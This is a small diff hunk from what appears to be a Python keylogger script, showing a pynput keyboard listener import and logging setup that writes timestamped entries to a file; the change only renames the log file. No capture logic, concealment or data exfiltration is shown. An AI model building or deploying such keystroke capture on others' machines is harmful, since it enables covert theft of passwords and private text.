@@ -2,7 +2,7 @@ from pynput.keyboard import Listener
 import logging as log
 
 log.basicConfig(
-	filename = 'keyLog.txt',
+	filename = 'key_log.txt',
 	level = log.DEBUG,
 	format = '%(asctime)s - %(message)s'
 )
